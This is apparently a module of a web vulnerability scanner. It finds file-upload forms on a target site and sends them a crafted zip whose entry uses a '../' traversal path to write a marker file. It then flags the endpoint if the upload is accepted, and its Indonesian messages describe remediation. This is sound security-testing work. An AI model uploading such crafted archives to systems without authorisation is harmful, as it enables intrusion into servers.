"""Zip-slip probe (path traversal in zip extraction)."""
from __future__ import annotations

import io
import re
import zipfile

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.recon.crawler import get_state

UPLOAD_HINTS = re.compile(r"(upload|import|extract|zip)", re.I)


def _make_evil_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../../../../tmp/cyberloka_zipslip.txt", b"cyberloka-marker")
        zf.writestr("normal.txt", b"hello")
    return buf.getvalue()


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    s = get_state(config)
    if not s:
        return findings
    forms = []
    for f in s.forms:
        if any(i.get("type") == "file" for i in f["inputs"]) and \
           UPLOAD_HINTS.search(f.get("action") or ""):
            forms.append(f)
    if not forms:
        return findings

    client = HttpClient(config)
    payload = _make_evil_zip()
    try:
        for form in forms[:2]:
            file_field = next((i for i in form["inputs"] if i.get("type") == "file"), None)
            if not file_field:
                continue
            other = {i["name"]: (i.get("value") or "x") for i in form["inputs"]
                     if i is not file_field and i.get("type") not in ("submit", "button")}
            files = {file_field["name"]: ("payload.zip", io.BytesIO(payload), "application/zip")}
            r = client.post(form["action"], data=other, files=files)
            if r is None:
                continue
            body = (r.text or "").lower()
            # Server menerima zip = sudah cukup waspada; verifikasi manual diperlukan
            if r.status_code in (200, 201) and not any(
                e in body for e in ("invalid", "error", "rejected", "ditolak", "gagal")
            ):
                findings.append(Finding(
                    module="zip_slip", target=form["action"],
                    title=f"Endpoint upload menerima zip dengan path traversal",
                    severity=Severity.HIGH,
                    description=("Server menerima zip yang berisi entry dengan path `../../`. "
                                 "Verifikasi MANUAL: cek apakah file `/tmp/cyberloka_zipslip.txt` "
                                 "atau path serupa ter-create di server."),
                    evidence=f"status={r.status_code}",
                    cwe="CWE-22", confidence="tentative",
                    remediation=("Saat extract zip, cek setiap entry: resolve absolute path "
                                 "lalu verifikasi prefix tetap dalam direktori target. Pakai "
                                 "library yang aman (mis. `zipfile.extractall(members=safe_members)`)."),
                    references=["https://snyk.io/research/zip-slip-vulnerability"],
                ))
                return findings
    finally:
        client.close()
    return findings
